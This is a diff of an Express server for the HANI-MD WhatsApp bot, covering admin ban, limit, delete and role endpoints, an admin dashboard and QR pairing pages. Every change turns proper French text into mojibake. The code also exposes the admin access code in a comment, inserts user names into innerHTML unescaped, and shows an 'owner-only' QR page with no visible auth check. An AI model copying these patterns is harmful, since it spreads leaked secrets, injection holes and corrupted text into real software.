+    res.json({ success: true, message: `${jid} a Ã©tÃ© banni` });
   } catch (error) {
     console.error("[ADMIN ERROR] Ban:", error.message);
     res.status(500).json({ error: "Erreur serveur: " + error.message });
   }
 });
 
-// ✅ API pour DÉBANNIR un utilisateur
+// âœ… API pour DÃ‰BANNIR un utilisateur
 app.post("/api/admin/unban", (req, res) => {
   try {
     const token = req.headers['x-admin-token'];
     if (!isValidSession(token)) {
-      return res.status(401).json({ error: "Non autorisé" });
+      return res.status(401).json({ error: "Non autorisÃ©" });
     }
     
     const { jid } = req.body;
@@ -9422,22 +9422,22 @@ app.post("/api/admin/unban", (req, res) => {
     if (index > -1) {
       db.data.banned.splice(index, 1);
       db.save();
-      console.log(`[ADMIN] ✅ Utilisateur débanni: ${jid}`);
+      console.log(`[ADMIN] âœ… Utilisateur dÃ©banni: ${jid}`);
     }
     
-    res.json({ success: true, message: `${jid} a été débanni` });
+    res.json({ success: true, message: `${jid} a Ã©tÃ© dÃ©banni` });
   } catch (error) {
     console.error("[ADMIN ERROR] Unban:", error.message);
     res.status(500).json({ error: "Erreur serveur: " + error.message });
   }
 });
 
-// ⚠️ API pour LIMITER un utilisateur (restreindre commandes)
+// âš ï¸ API pour LIMITER un utilisateur (restreindre commandes)
 app.post("/api/admin/limit", (req, res) => {
   try {
     const token = req.headers['x-admin-token'];
     if (!isValidSession(token)) {
-      return res.status(401).json({ error: "Non autorisé" });
+      return res.status(401).json({ error: "Non autorisÃ©" });
     }
     
     const { jid, level } = req.body;
@@ -9447,7 +9447,7 @@ app.post("/api/admin/limit", (req, res) => {
     
     // Niveaux de limitation:
     // 1 = Basique (menu, help seulement)
-    // 2 = Moyen (pas de téléchargement, pas d'IA)
+    // 2 = Moyen (pas de tÃ©lÃ©chargement, pas d'IA)
     // 3 = Strict (commandes fun seulement)
     
     db.data.limitedUsers[jid] = {
@@ -9457,15 +9457,15 @@ app.post("/api/admin/limit", (req, res) => {
     };
     db.save();
     
-    console.log(`[ADMIN] ⚠️ Utilisateur limité (niveau ${level}): ${jid}`);
-    res.json({ success: true, message: `${jid} limité au niveau ${level}` });
+    console.log(`[ADMIN] âš ï¸ Utilisateur limitÃ© (niveau ${level}): ${jid}`);
+    res.json({ success: true, message: `${jid} limitÃ© au niveau ${level}` });
   } catch (error) {
     console.error("[ADMIN ERROR] Limit:", error.message);
     res.status(500).json({ error: "Erreur serveur: " + error.message });
   }
 });
 
-// Fonction pour obtenir les commandes bloquées par niveau
+// Fonction pour obtenir les commandes bloquÃ©es par niveau
 function getBlockedCommands(level) {
   const levels = {
     1: ['owner', 'sudo', 'ban', 'unban', 'setowner', 'restart', 'eval', 'exec'],
@@ -9480,12 +9480,12 @@ function getBlockedCommands(level) {
   return levels[level] || levels[1];
 }
 
-// ✅ API pour RETIRER les limitations
+// âœ… API pour RETIRER les limitations
 app.post("/api/admin/unlimit", (req, res) => {
   try {
     const token = req.headers['x-admin-token'];
     if (!isValidSession(token)) {
-      return res.status(401).json({ error: "Non autorisé" });
+      return res.status(401).json({ error: "Non autorisÃ©" });
     }
     
     const { jid } = req.body;
@@ -9496,57 +9496,57 @@ app.post("/api/admin/unlimit", (req, res) => {
     if (db.data.limitedUsers[jid]) {
       delete db.data.limitedUsers[jid];
       db.save();
-      console.log(`[ADMIN] ✅ Limitations retirées: ${jid}`);
+      console.log(`[ADMIN] âœ… Limitations retirÃ©es: ${jid}`);
     }
     
-    res.json({ success: true, message: `Limitations retirées pour ${jid}` });
+    res.json({ success: true, message: `Limitations retirÃ©es pour ${jid}` });
   } catch (error) {
     console.error("[ADMIN ERROR] Unlimit:", error.message);
     res.status(500).json({ error: "Erreur serveur: " + error.message });
   }
 });
 
-// 🗑️ API pour SUPPRIMER un utilisateur de la base
+// ðŸ—‘ï¸ API pour SUPPRIMER un utilisateur de la base
 app.post("/api/admin/delete", (req, res) => {
   try {
     const token = req.headers['x-admin-token'];
     if (!isValidSession(token)) {
-      return res.status(401).json({ error: "Non autorisé" });
+      return res.status(401).json({ error: "Non autorisÃ©" });
     }
     
     const { jid } = req.body;
     if (!jid) return res.status(400).json({ error: "JID requis" });
     
-    // Admin a le contrôle total - peut supprimer n'importe qui
+    // Admin a le contrÃ´le total - peut supprimer n'importe qui
     if (!db.data.users) db.data.users = {};
     
     if (db.data.users[jid]) {
       delete db.data.users[jid];
       db.save();
-      console.log(`[ADMIN] 🗑️ Utilisateur supprimé: ${jid}`);
+      console.log(`[ADMIN] ðŸ—‘ï¸ Utilisateur supprimÃ©: ${jid}`);
     }
     
-    res.json({ success: true, message: `${jid} supprimé` });
+    res.json({ success: true, message: `${jid} supprimÃ©` });
   } catch (error) {
     console.error("[ADMIN ERROR] Delete:", error.message);
     res.status(500).json({ error: "Erreur serveur: " + error.message });
   }
 });
 
-// 👑 API pour changer le RÔLE d'un utilisateur
+// ðŸ‘‘ API pour changer le RÃ”LE d'un utilisateur
 app.post("/api/admin/role", (req, res) => {
   try {
     const token = req.headers['x-admin-token'];
     if (!isValidSession(token)) {
-      return res.status(401).json({ error: "Non autorisé" });
+      return res.status(401).json({ error: "Non autorisÃ©" });
     }
     
     const { jid, role } = req.body;
-    if (!jid || !role) return res.status(400).json({ error: "JID et rôle requis" });
+    if (!jid || !role) return res.status(400).json({ error: "JID et rÃ´le requis" });
     
     const validRoles = ['user', 'approved', 'sudo', 'owner'];
     if (!validRoles.includes(role)) {
-      return res.status(400).json({ error: "Rôle invalide" });
+      return res.status(400).json({ error: "RÃ´le invalide" });
     }
     
     if (!db.data.users) db.data.users = {};
@@ -9558,7 +9558,7 @@ app.post("/api/admin/role", (req, res) => {
     db.data.users[jid].role = role;
     db.save();
     
-    console.log(`[ADMIN] 👑 Rôle changé: ${jid} → ${role}`);
+    console.log(`[ADMIN] ðŸ‘‘ RÃ´le changÃ©: ${jid} â†’ ${role}`);
     res.json({ success: true, message: `${jid} est maintenant ${role}` });
   } catch (error) {
     console.error("[ADMIN ERROR] Role:", error.message);
@@ -9566,7 +9566,7 @@ app.post("/api/admin/role", (req, res) => {
   }
 });
 
-// 🔐 PAGE ADMIN SÉCURISÉE - Code d'accès: 200700
+// ðŸ” PAGE ADMIN SÃ‰CURISÃ‰E - Code d'accÃ¨s: 200700
 app.get("/admin", async (req, res) => {
   res.send(`
 <!DOCTYPE html>
@@ -9574,7 +9574,7 @@ app.get("/admin", async (req, res) => {
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>🔐 HANI-MD Super Admin</title>
+  <title>ðŸ” HANI-MD Super Admin</title>
   <style>
     * { margin: 0; padding: 0; box-sizing: border-box; }
     body {
@@ -9831,57 +9831,57 @@ app.get("/admin", async (req, res) => {
 <body>
   <div class="container">
     <div class="header">
-      <h1>🔐 <span>HANI-MD</span> Super Admin</h1>
-      <div id="botStatus" class="status-indicator status-offline">⏳ Chargement...</div>
+      <h1>ðŸ” <span>HANI-MD</span> Super Admin</h1>
+      <div id="botStatus" class="status-indicator status-offline">â³ Chargement...</div>
     </div>
     
     <!-- Login -->
     <div id="loginPage" class="login-box">
-      <h2>🔑 Accès Owner</h2>
-      <p style="color:rgba(255,255,255,0.6);margin-bottom:20px;font-size:0.9em">Zone réservée au propriétaire</p>
-      <input type="password" id="codeInput" placeholder="••••••" maxlength="6">
-      <button onclick="login()">🚀 Accéder</button>
-      <p id="errorMsg" class="error-msg">❌ Code incorrect</p>
+      <h2>ðŸ”‘ AccÃ¨s Owner</h2>
+      <p style="color:rgba(255,255,255,0.6);margin-bottom:20px;font-size:0.9em">Zone rÃ©servÃ©e au propriÃ©taire</p>
+      <input type="password" id="codeInput" placeholder="â€¢â€¢â€¢â€¢â€¢â€¢" maxlength="6">
+      <button onclick="login()">ðŸš€ AccÃ©der</button>
+      <p id="errorMsg" class="error-msg">âŒ Code incorrect</p>
     </div>
     
     <!-- Dashboard -->
     <div id="dashboard" class="dashboard">
       <!-- Quick Actions -->
       <div class="quick-actions">
-        <button class="quick-btn btn-primary" onclick="refreshStats()">🔄 Actualiser</button>
-        <a href="/qr" class="quick-btn btn-success" style="text-decoration:none">📱 QR Code</a>
-        <button class="quick-btn btn-danger" onclick="logout()">🚪 Déconnexion</button>
+        <button class="quick-btn btn-primary" onclick="refreshStats()">ðŸ”„ Actualiser</button>
+        <a href="/qr" class="quick-btn btn-success" style="text-decoration:none">ðŸ“± QR Code</a>
+        <button class="quick-btn btn-danger" onclick="logout()">ðŸšª DÃ©connexion</button>
       </div>
       
       <!-- Stats -->
       <div class="stats-grid">
         <div class="stat-card">
-          <div class="emoji">👥</div>
+          <div class="emoji">ðŸ‘¥</div>
           <div class="number" id="statUsers">0</div>
           <div class="label">Total Users</div>
         </div>
         <div class="stat-card">
-          <div class="emoji">👑</div>
+          <div class="emoji">ðŸ‘‘</div>
           <div class="number" id="statOwners">0</div>
           <div class="label">Owners</div>
         </div>
         <div class="stat-card">
-          <div class="emoji">⚡</div>
+          <div class="emoji">âš¡</div>
           <div class="number" id="statSudos">0</div>
           <div class="label">Sudos</div>
         </div>
         <div class="stat-card">
-          <div class="emoji">🚫</div>
+          <div class="emoji">ðŸš«</div>
           <div class="number" id="statBanned">0</div>
           <div class="label">Bannis</div>
         </div>
         <div class="stat-card">
-          <div class="emoji">⚠️</div>
+          <div class="emoji">âš ï¸</div>
           <div class="number" id="statLimited">0</div>
-          <div class="label">Limités</div>
+          <div class="label">LimitÃ©s</div>
         </div>
         <div class="stat-card">
-          <div class="emoji">📨</div>
+          <div class="emoji">ðŸ“¨</div>
           <div class="number" id="statMessages">0</div>
           <div class="label">Messages</div>
         </div>
@@ -9889,22 +9889,22 @@ app.get("/admin", async (req, res) => {
       
       <!-- Users Management -->
       <div class="users-section">
-        <h3 style="margin-bottom:15px">👥 Gestion des Utilisateurs</h3>
+        <h3 style="margin-bottom:15px">ðŸ‘¥ Gestion des Utilisateurs</h3>
         
         <div class="search-box">
-          <input type="text" id="searchInput" placeholder="🔍 Rechercher par numéro ou nom..." onkeyup="filterUsers()">
+          <input type="text" id="searchInput" placeholder="ðŸ” Rechercher par numÃ©ro ou nom..." onkeyup="filterUsers()">
           <select id="filterRole" class="filter-select" onchange="filterUsers()">
-            <option value="">Tous les rôles</option>
-            <option value="owner">👑 Owner</option>
-            <option value="sudo">⚡ Sudo</option>
-            <option value="approved">✅ Approved</option>
-            <option value="user">👤 User</option>
+            <option value="">Tous les rÃ´les</option>
+            <option value="owner">ðŸ‘‘ Owner</option>
+            <option value="sudo">âš¡ Sudo</option>
+            <option value="approved">âœ… Approved</option>
+            <option value="user">ðŸ‘¤ User</option>
           </select>
           <select id="filterStatus" class="filter-select" onchange="filterUsers()">
             <option value="">Tous les statuts</option>
-            <option value="active">✅ Actifs</option>
-            <option value="banned">🚫 Bannis</option>
-            <option value="limited">⚠️ Limités</option>
+            <option value="active">âœ… Actifs</option>
+            <option value="banned">ðŸš« Bannis</option>
+            <option value="limited">âš ï¸ LimitÃ©s</option>
           </select>
         </div>
         
@@ -9912,12 +9912,12 @@ app.get("/admin", async (req, res) => {
           <table>
             <thead>
               <tr>
-                <th>📱 Numéro</th>
-                <th>👤 Nom</th>
-                <th>🎭 Rôle</th>
-                <th>📊 Statut</th>
-                <th>💬 Msgs</th>
-                <th>⚡ Actions</th>
+                <th>ðŸ“± NumÃ©ro</th>
+                <th>ðŸ‘¤ Nom</th>
+                <th>ðŸŽ­ RÃ´le</th>
+                <th>ðŸ“Š Statut</th>
+                <th>ðŸ’¬ Msgs</th>
+                <th>âš¡ Actions</th>
               </tr>
             </thead>
             <tbody id="usersTableBody">
@@ -9932,11 +9932,11 @@ app.get("/admin", async (req, res) => {
   <!-- Modal Limitation -->
   <div id="limitModal" class="modal">
     <div class="modal-content">
-      <h3>⚠️ Limiter l'utilisateur</h3>
+      <h3>âš ï¸ Limiter l'utilisateur</h3>
       <p id="limitUserName" style="margin-bottom:15px;color:#aaa"></p>
       <select id="limitLevel">
         <option value="1">Niveau 1 - Basique (menu, help seulement)</option>
-        <option value="2">Niveau 2 - Pas de téléchargement ni IA</option>
+        <option value="2">Niveau 2 - Pas de tÃ©lÃ©chargement ni IA</option>
         <option value="3">Niveau 3 - Commandes fun uniquement</option>
       </select>
       <div class="modal-btns">
@@ -9946,16 +9946,16 @@ app.get("/admin", async (req, res) => {
     </div>
   </div>
   
-  <!-- Modal Rôle -->
+  <!-- Modal RÃ´le -->
   <div id="roleModal" class="modal">
     <div class="modal-content">
-      <h3>👑 Changer le rôle</h3>
+      <h3>ðŸ‘‘ Changer le rÃ´le</h3>
       <p id="roleUserName" style="margin-bottom:15px;color:#aaa"></p>
       <select id="newRole">
-        <option value="user">👤 User - Accès normal</option>
-        <option value="approved">✅ Approved - Accès vérifié</option>
-        <option value="sudo">⚡ Sudo - Accès étendu</option>
-        <option value="owner">👑 Owner - Accès total</option>
+        <option value="user">ðŸ‘¤ User - AccÃ¨s normal</option>
+        <option value="approved">âœ… Approved - AccÃ¨s vÃ©rifiÃ©</option>
+        <option value="sudo">âš¡ Sudo - AccÃ¨s Ã©tendu</option>
+        <option value="owner">ðŸ‘‘ Owner - AccÃ¨s total</option>
       </select>
       <div class="modal-btns">
         <button onclick="closeModal()" style="background:#666;color:#fff">Annuler</button>
@@ -9996,7 +9996,7 @@ app.get("/admin", async (req, res) => {
           document.getElementById('codeInput').value = '';
         }
       } catch (e) {
-        errorMsg.textContent = '❌ Erreur de connexion';
+        errorMsg.textContent = 'âŒ Erreur de connexion';
         errorMsg.style.display = 'block';
       }
     }
@@ -10033,7 +10033,7 @@ app.get("/admin", async (req, res) => {
         // Bot status
         const botStatus = document.getElementById('botStatus');
         botStatus.className = 'status-indicator ' + (data.bot.connected ? 'status-online' : 'status-offline');
-        botStatus.textContent = data.bot.connected ? '🟢 Bot Connecté' : '🔴 Déconnecté';
+        botStatus.textContent = data.bot.connected ? 'ðŸŸ¢ Bot ConnectÃ©' : 'ðŸ”´ DÃ©connectÃ©';
         
         // Stats
         document.getElementById('statUsers').textContent = data.local.totalUsers;
@@ -10058,35 +10058,35 @@ app.get("/admin", async (req, res) => {
       }
       
       tbody.innerHTML = users.map(u => {
-        let statusBadge = '<span class="status-badge status-active">✅ Actif</span>';
-        if (u.isBanned) statusBadge = '<span class="status-badge status-banned">🚫 Banni</span>';
-        else if (u.isLimited) statusBadge = '<span class="status-badge status-limited">⚠️ Limité</span>';
+        let statusBadge = '<span class="status-badge status-active">âœ… Actif</span>';
+        if (u.isBanned) statusBadge = '<span class="status-badge status-banned">ðŸš« Banni</span>';
+        else if (u.isLimited) statusBadge = '<span class="status-badge status-limited">âš ï¸ LimitÃ©</span>';
         
-        // Échapper les valeurs pour éviter les problèmes de syntaxe
+        // Ã‰chapper les valeurs pour Ã©viter les problÃ¨mes de syntaxe
         const safeJid = u.jid.replace(/'/g, "\\\\'");
         const safeName = (u.name || 'Inconnu').replace(/'/g, "\\\\'");
         const safeRole = u.role || 'user';
         
-        // Admin a le contrôle total sur tous les utilisateurs, y compris les owners
+        // Admin a le contrÃ´le total sur tous les utilisateurs, y compris les owners
         let actions = '';
         if (u.isBanned) {
-          actions += '<button class="action-btn btn-unban" onclick="unbanUser(\\'' + safeJid + '\\')">✅ Débannir</button>';
+          actions += '<button class="action-btn btn-unban" onclick="unbanUser(\\'' + safeJid + '\\')">âœ… DÃ©bannir</button>';
         } else {
-          actions += '<button class="action-btn btn-ban" onclick="banUser(\\'' + safeJid + '\\')">🚫 Bannir</button>';
+          actions += '<button class="action-btn btn-ban" onclick="banUser(\\'' + safeJid + '\\')">ðŸš« Bannir</button>';
         }
         
         if (u.isLimited) {
-          actions += '<button class="action-btn btn-unlimit" onclick="unlimitUser(\\'' + safeJid + '\\')">🔓 Délimiter</button>';
+          actions += '<button class="action-btn btn-unlimit" onclick="unlimitUser(\\'' + safeJid + '\\')">ðŸ”“ DÃ©limiter</button>';
         } else {
-          actions += '<button class="action-btn btn-limit" onclick="openLimitModal(\\'' + safeJid + '\\', \\'' + safeName + '\\')">⚠️ Limiter</button>';
+          actions += '<button class="action-btn btn-limit" onclick="openLimitModal(\\'' + safeJid + '\\', \\'' + safeName + '\\')">âš ï¸ Limiter</button>';
         }
         
-        actions += '<button class="action-btn btn-role" onclick="openRoleModal(\\'' + safeJid + '\\', \\'' + safeName + '\\', \\'' + safeRole + '\\')">👑</button>';
-        actions += '<button class="action-btn btn-delete" onclick="deleteUser(\\'' + safeJid + '\\')">🗑️</button>';
+        actions += '<button class="action-btn btn-role" onclick="openRoleModal(\\'' + safeJid + '\\', \\'' + safeName + '\\', \\'' + safeRole + '\\')">ðŸ‘‘</button>';
+        actions += '<button class="action-btn btn-delete" onclick="deleteUser(\\'' + safeJid + '\\')">ðŸ—‘ï¸</button>';
         
         return '<tr>' +
           '<td>' + u.number + '</td>' +
-          '<td>' + (u.name || 'Inconnu') + (u.isBot ? ' 🤖' : '') + '</td>' +
+          '<td>' + (u.name || 'Inconnu') + (u.isBot ? ' ðŸ¤–' : '') + '</td>' +
           '<td><span class="role-badge role-' + safeRole + '">' + safeRole + '</span></td>' +
           '<td>' + statusBadge + '</td>' +
           '<td>' + (u.messages || 0) + '</td>' +
@@ -10152,7 +10152,7 @@ app.get("/admin", async (req, res) => {
     }
     
     async function deleteUser(jid) {
-      if (!confirm('Supprimer définitivement cet utilisateur ?')) return;
+      if (!confirm('Supprimer dÃ©finitivement cet utilisateur ?')) return;
       await apiAction('/api/admin/delete', { jid });
     }
     
@@ -10173,8 +10173,8 @@ app.get("/admin", async (req, res) => {
         }
         
         const data = await res.json();
-        console.log('[ADMIN] Réponse:', data);
-        showToast(data.message || (data.success ? 'Succès!' : (data.error || 'Erreur')), data.success ? 'success' : 'error');
+        console.log('[ADMIN] RÃ©ponse:', data);
+        showToast(data.message || (data.success ? 'SuccÃ¨s!' : (data.error || 'Erreur')), data.success ? 'success' : 'error');
         if (data.success) refreshStats();
       } catch (e) {
         console.error('[ADMIN] Exception:', e);
@@ -10214,7 +10214,7 @@ app.get("/health", (req, res) => {
   });
 });
 
-// 🗄️ API MySQL Status - Test de connexion
+// ðŸ—„ï¸ API MySQL Status - Test de connexion
 app.get("/api/mysql-status", async (req, res) => {
   try {
     const isConnected = mysqlDB.isConnected();
@@ -10235,8 +10235,8 @@ app.get("/api/mysql-status", async (req, res) => {
       success: true,
       mysql: {
         connected: isConnected,
-        host: process.env.MYSQL_HOST || 'Non configuré',
-        database: process.env.MYSQL_DATABASE || 'Non configuré',
+        host: process.env.MYSQL_HOST || 'Non configurÃ©',
+        database: process.env.MYSQL_DATABASE || 'Non configurÃ©',
         tables: tables,
         stats: stats
       },
@@ -10257,11 +10257,11 @@ app.get("/api/mysql-status", async (req, res) => {
   }
 });
 
-// 🔄 API pour tester la connexion MySQL
+// ðŸ”„ API pour tester la connexion MySQL
 app.post("/api/mysql-test", async (req, res) => {
   try {
     if (mysqlDB.isConnected()) {
-      // Test de lecture/écriture
+      // Test de lecture/Ã©criture
       await mysqlDB.incrementStats('commands');
       const stats = await mysqlDB.getStats();
       res.json({
@@ -10278,7 +10278,7 @@ app.post("/api/mysql-test", async (req, res) => {
       const connected = await mysqlDB.connect();
       res.json({
         success: connected,
-        message: connected ? "Connexion MySQL établie!" : "Échec de connexion - Vérifiez vos identifiants"
+        message: connected ? "Connexion MySQL Ã©tablie!" : "Ã‰chec de connexion - VÃ©rifiez vos identifiants"
       });
     }
   } catch (error) {
@@ -10289,7 +10289,7 @@ app.post("/api/mysql-test", async (req, res) => {
   }
 });
 
-// API pour obtenir l'état du QR (pour AJAX) - Accessible publiquement pour la page QR
+// API pour obtenir l'Ã©tat du QR (pour AJAX) - Accessible publiquement pour la page QR
 app.get("/api/qr-status", (req, res) => {
   res.json({
     status: qrState.connectionStatus,
@@ -10302,7 +10302,7 @@ app.get("/api/qr-status", (req, res) => {
   });
 });
 
-// 📸 PAGE QR SIMPLE - Affiche juste l'image QR (plus fiable)
+// ðŸ“¸ PAGE QR SIMPLE - Affiche juste l'image QR (plus fiable)
 app.get("/qr-simple", (req, res) => {
   if (qrState.isConnected) {
     res.send(`
@@ -10310,7 +10310,7 @@ app.get("/qr-simple", (req, res) => {
 <html>
 <head>
   <meta charset="UTF-8">
-  <title>✅ HANI-MD Connecté</title>
+  <title>âœ… HANI-MD ConnectÃ©</title>
   <style>
     body { font-family: Arial; background: #1a1a2e; color: #fff; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; flex-direction: column; }
     h1 { color: #4CAF50; font-size: 3em; }
@@ -10318,9 +10318,9 @@ app.get("/qr-simple", (req, res) => {
   </style>
 </head>
 <body>
-  <h1>✅ Connecté!</h1>
+  <h1>âœ… ConnectÃ©!</h1>
   <p>Le bot HANI-MD est maintenant actif.</p>
-  <p style="margin-top: 20px;"><a href="/" style="color: #9c27b0;">← Retour</a></p>
+  <p style="margin-top: 20px;"><a href="/" style="color: #9c27b0;">â† Retour</a></p>
 </body>
 </html>`);
   } else if (qrState.qrDataURL) {
@@ -10330,7 +10330,7 @@ app.get("/qr-simple", (req, res) => {
 <head>
   <meta charset="UTF-8">
   <meta http-equiv="refresh" content="5">
-  <title>📱 HANI-MD - Scanne le QR</title>
+  <title>ðŸ“± HANI-MD - Scanne le QR</title>
   <style>
     body { font-family: Arial; background: #1a1a2e; color: #fff; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; flex-direction: column; }
     img { border-radius: 15px; box-shadow: 0 0 30px rgba(156,39,176,0.5); }
@@ -10340,10 +10340,10 @@ app.get("/qr-simple", (req, res) => {
   </style>
 </head>
 <body>
-  <h2>📱 Scanne avec WhatsApp</h2>
+  <h2>ðŸ“± Scanne avec WhatsApp</h2>
   <img src="${qrState.qrDataURL}" alt="QR Code" width="300">
-  <p>⏱️ Page auto-refresh toutes les 5 secondes</p>
-  <p class="refresh">Si expiré, attendez le nouveau QR...</p>
+  <p>â±ï¸ Page auto-refresh toutes les 5 secondes</p>
+  <p class="refresh">Si expirÃ©, attendez le nouveau QR...</p>
 </body>
 </html>`);
   } else {
@@ -10353,7 +10353,7 @@ app.get("/qr-simple", (req, res) => {
 <head>
   <meta charset="UTF-8">
   <meta http-equiv="refresh" content="3">
-  <title>⏳ HANI-MD - En attente</title>
+  <title>â³ HANI-MD - En attente</title>
   <style>
     body { font-family: Arial; background: #1a1a2e; color: #fff; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; flex-direction: column; }
     .loader { width: 50px; height: 50px; border: 5px solid #333; border-top: 5px solid #9c27b0; border-radius: 50%; animation: spin 1s linear infinite; }
@@ -10363,14 +10363,14 @@ app.get("/qr-simple", (req, res) => {
 </head>
 <body>
   <div class="loader"></div>
-  <p>Génération du QR code en cours...</p>
+  <p>GÃ©nÃ©ration du QR code en cours...</p>
   <p style="font-size: 0.8em;">Page auto-refresh toutes les 3 secondes</p>
 </body>
 </html>`);
   }
 });
 
-// 📱 PAGE QR CODE - SÉCURISÉE (Owner uniquement)
+// ðŸ“± PAGE QR CODE - SÃ‰CURISÃ‰E (Owner uniquement)
 app.get("/qr", (req, res) => {
   res.send(`
 <!DOCTYPE html>
@@ -10378,7 +10378,7 @@ app.get("/qr", (req, res) => {
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>🔐 HANI-MD - QR Code Privé</title>
+  <title>ðŸ” HANI-MD - QR Code PrivÃ©</title>
   <style>
     * { margin: 0; padding: 0; box-sizing: border-box; }
     body {
@@ -10549,16 +10549,16 @@ app.get("/qr", (req, res) => {
 </head>
 <body>
   <div class="container">
-    <div class="logo">🌟</div>
+    <div class="logo">ðŸŒŸ</div>
     <h1>HANI-MD</h1>
     <p class="subtitle">Bot WhatsApp Intelligent par H2025</p>
     
     <div id="status-container">
-      <div class="status disconnected" id="status-badge">⏳ Chargement...</div>
+      <div class="status disconnected" id="status-badge">â³ Chargement...</div>
     </div>
     
     <div id="countdown-container" style="display:none;">
-      <div class="countdown-text" id="countdown-text">⏱️ 60 secondes restantes</div>
+      <div class="countdown-text" id="countdown-text">â±ï¸ 60 secondes restantes</div>
       <div class="countdown-bar" id="countdown-bar" style="width: 100%"></div>
     </div>
     
@@ -10567,23 +10567,23 @@ app.get("/qr", (req, res) => {
     </div>
     
     <div id="buttons-container">
-      <button class="refresh-btn" id="refresh-btn" onclick="forceRefresh()">🔄 Nouveau QR Code</button>
+      <button class="refresh-btn" id="refresh-btn" onclick="forceRefresh()">ðŸ”„ Nouveau QR Code</button>
     </div>
     
     <div id="instructions" class="instructions">
-      <h3>📱 Comment scanner :</h3>
+      <h3>ðŸ“± Comment scanner :</h3>
       <ol>
-        <li>Ouvre <strong>WhatsApp</strong> sur ton téléphone</li>
-        <li>Menu <strong>⋮</strong> → <strong>Appareils connectés</strong></li>
+        <li>Ouvre <strong>WhatsApp</strong> sur ton tÃ©lÃ©phone</li>
+        <li>Menu <strong>â‹®</strong> â†’ <strong>Appareils connectÃ©s</strong></li>
         <li>Clique <strong>"Connecter un appareil"</strong></li>
         <li><strong>Scanne rapidement</strong> le QR code (60s max)</li>
       </ol>
     </div>
     
     <div id="bot-info" class="bot-info" style="display:none;">
-      <h3>🎉 Connecté avec succès!</h3>
-      <p id="bot-name">🤖 Chargement...</p>
-      <p id="bot-number">📱 Chargement...</p>
+      <h3>ðŸŽ‰ ConnectÃ© avec succÃ¨s!</h3>
+      <p id="bot-name">ðŸ¤– Chargement...</p>
+      <p id="bot-number">ðŸ“± Chargement...</p>
       <p style="margin-top:15px;font-size:0.9em;color:#8BC34A;">Le bot est maintenant actif!</p>
     </div>
     
@@ -10594,8 +10594,8 @@ app.get("/qr", (req, res) => {
     </div>
     
     <div class="footer">
-      <p>Créé avec ❤️ par <a href="#">H2025</a></p>
-      <p><a href="/">← Retour</a> | <a href="/admin">🔐 Admin</a></p>
+      <p>CrÃ©Ã© avec â¤ï¸ par <a href="#">H2025</a></p>
+      <p><a href="/">â† Retour</a> | <a href="/admin">ðŸ” Admin</a></p>
     </div>
   </div>
 
@@ -10626,15 +10626,15 @@ app.get("/qr", (req, res) => {
         if (remaining <= 10) {
           bar.className = 'countdown-bar danger';
           text.className = 'countdown-text danger';
-          text.textContent = '⚠️ ' + remaining + 's - SCANNE VITE!';
+          text.textContent = 'âš ï¸ ' + remaining + 's - SCANNE VITE!';
         } else if (remaining <= 20) {
           bar.className = 'countdown-bar warning';
           text.className = 'countdown-text warning';
-          text.textContent = '⏱️ ' + remaining + ' secondes restantes';
+          text.textContent = 'â±ï¸ ' + remaining + ' secondes restantes';
         } else {
           bar.className = 'countdown-bar';
           text.className = 'countdown-text';
-          text.textContent = '⏱️ ' + remaining + ' secondes restantes';
+          text.textContent = 'â±ï¸ ' + remaining + ' secondes restantes';
         }
         
         if (remaining <= 0) {
@@ -10654,15 +10654,15 @@ app.get("/qr", (req, res) => {
     
     function showExpired() {
       stopCountdown();
-      document.getElementById('qr-container').innerHTML = '<div class="qr-expired"><div class="icon">⏰</div><p><strong>QR Code expiré!</strong></p><p>Clique sur le bouton pour en générer un nouveau</p></div>';
-      document.getElementById('status-badge').textContent = '⏰ QR Expiré';
+      document.getElementById('qr-container').innerHTML = '<div class="qr-expired"><div class="icon">â°</div><p><strong>QR Code expirÃ©!</strong></p><p>Clique sur le bouton pour en gÃ©nÃ©rer un nouveau</p></div>';
+      document.getElementById('status-badge').textContent = 'â° QR ExpirÃ©';
       document.getElementById('status-badge').className = 'status disconnected';
     }
     
     async function forceRefresh() {
       const btn = document.getElementById('refresh-btn');
       btn.disabled = true;
-      btn.textContent = '⏳ Chargement...';
+      btn.textContent = 'â³ Chargement...';
       
       // Recharger la page pour forcer un nouveau QR
       window.location.reload();
@@ -10685,23 +10685,23 @@ app.get("/qr", (req, res) => {
         const refreshBtn = document.getElementById('refresh-btn');
         
         if (data.status === 'connected' || data.isConnected) {
-          // CONNECTÉ !
+          // CONNECTÃ‰ !
           stopCountdown();
-          statusBadge.textContent = '✅ Connecté';
+          statusBadge.textContent = 'âœ… ConnectÃ©';
           statusBadge.className = 'status connected';
-          qrContainer.innerHTML = '<div style="text-align:center;color:#4CAF50;font-size:5em;">✓</div>';
+          qrContainer.innerHTML = '<div style="text-align:center;color:#4CAF50;font-size:5em;">âœ“</div>';
           instructions.style.display = 'none';
           botInfo.style.display = 'block';
           refreshBtn.style.display = 'none';
           
           if (data.botInfo) {
-            document.getElementById('bot-name').textContent = '🤖 ' + (data.botInfo.name || 'HANI-MD');
-            document.getElementById('bot-number').textContent = '📱 ' + (data.botInfo.number || 'Connecté');
+            document.getElementById('bot-name').textContent = 'ðŸ¤– ' + (data.botInfo.name || 'HANI-MD');
+            document.getElementById('bot-number').textContent = 'ðŸ“± ' + (data.botInfo.number || 'ConnectÃ©');
           }
           
         } else if (data.hasQR && data.qrDataURL) {
           // QR CODE DISPONIBLE
-          statusBadge.textContent = '📱 Scanne le QR Code!';
+          statusBadge.textContent = 'ðŸ“± Scanne le QR Code!';
           statusBadge.className = 'status waiting_qr';
           
           // Nouveau QR code?
@@ -10715,21 +10715,21 @@ app.get("/qr", (req, res) => {
           botInfo.style.display = 'none';
           refreshBtn.style.display = 'inline-block';
           refreshBtn.disabled = false;
-          refreshBtn.textContent = '🔄 Nouveau QR Code';
+          refreshBtn.textContent = 'ðŸ”„ Nouveau QR Code';
           
         } else if (data.status === 'connecting') {
           // CONNEXION EN COURS
           stopCountdown();
-          statusBadge.textContent = '🔄 Connexion en cours...';
+          statusBadge.textContent = 'ðŸ”„ Connexion en cours...';
           statusBadge.className = 'status connecting';
-          qrContainer.innerHTML = '<div class="loader"></div><p style="color:#333;margin-top:15px;">Vérification...</p>';
